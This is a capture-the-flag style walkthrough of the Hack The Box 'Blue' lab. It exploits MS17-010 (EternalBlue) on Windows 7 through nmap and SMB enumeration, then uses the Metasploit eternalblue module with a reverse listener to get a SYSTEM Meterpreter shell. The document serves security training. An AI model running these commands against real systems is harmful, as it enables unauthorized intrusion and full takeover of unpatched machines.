<div align="left">

<img src="https://img.shields.io/badge/FuzzRaiders_Team_Member-0a66ff?style=flat-square&logo=github" />
<img src="https://img.shields.io/badge/Anka0x-0f172a?style=flat-square" />
<img src="https://img.shields.io/badge/🎯%20Role-Internal_Pentest-1e293b?style=flat-square" />
<img src="https://img.shields.io/badge/📜%20Certification-PNPT_(TCM_Security)-334155?style=flat-square" />
<img src="https://img.shields.io/badge/🟢%20Status-Completed-16a34a?style=flat-square" />

</div>

# Hack The Box: Blue

<div align="left">

![Category: Windows](https://img.shields.io/badge/Category-Windows-red)<br>
![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-blue)<br>
![Platform: Hack%20The%20Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-darkgreen)

</div>

---

# 📌 Overview

Blue is a classic Windows lab demonstrating exploitation of **MS17-010 (EternalBlue)** — a critical SMB vulnerability affecting Windows 7 systems.

The attack chain:

* SMB enumeration
* Vulnerability confirmation (MS17-010)
* Remote exploitation via Metasploit
* SYSTEM-level shell acquisition

This machine reinforces structured exploitation workflow in legacy Windows environments.

---

## 🛠 Tools Used

```
nmap                → service discovery
netexec (nxc)       → SMB authentication testing
msfconsole          → MS17-010 exploitation
meterpreter         → post-exploitation interaction
```

---

## <h1 style="color:pink;">Walkthrough steps</h1>

---

### Step 1  Recon (Nmap)

**Goal:** Identify open SMB ports and OS version.

```bash
nmap -sC -sV -T5 10.129.6.183 -oN nmap_result
```

**What to observe:**

* Port 445 open (SMB)
* Windows 7 Professional SP1 detected

![images](Images/1.png)
![images](Images/1.1.png)
---

### Step 2  SMB Enumeration

**Goal:** Check SMB shares and guest access.

```bash
smbclient -L //10.129.6.183
nxc smb 10.129.6.183 -u 'guest' -p ''
```

**What to observe:**

* SMB signing disabled
* Guest authentication possible

![images](Images/2.png)

---

### Step 3  Launch Metasploit & Load EternalBlue Module

**Goal:** Prepare MS17-010 exploit.

```text
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.6.183
set LHOST 10.10.15.197
set LPORT 4444
check
```

**What to observe:**

* Target is likely VULNERABLE to MS17-010

![images](Images/3.png)

---

### Step 4  Exploit Target

**Goal:** Execute EternalBlue attack.

```text
run
```

**What to observe:**

* Exploit stages successfully
* Meterpreter session opened

![images](Images/4.png)

---

### Step 5  Confirm SYSTEM Access

**Goal:** Verify privilege level and system details.

```text
getuid
sysinfo
```

**What to observe:**

* NT AUTHORITY\SYSTEM
* Windows 7 SP1 confirmed

![images](Images/5.png)

---

## 🧠 What This Lab Teaches

* Importance of SMB enumeration
* Identifying legacy unpatched systems
* Structured exploitation workflow
* Immediate SYSTEM-level impact of EternalBlue

---

## 📌 Conclusion

Blue reinforces a critical real-world lesson:

> Unpatched legacy systems can be fully compromised in seconds.

MS17-010 remains one of the most impactful Windows vulnerabilities in history, emphasizing the importance of patch management and SMB hardening.

---
This work is part of **FuzzRaiders**’ structured hands-on training and research program, where every lab, project, and technical study is formally documented, reviewed, and validated to ensure real-world applicability, methodological rigor and real-world security execution

Happy hacking 🚀

---

### Author
## [LinkedIn:](https://www.linkedin.com/in/manka-sec/)
---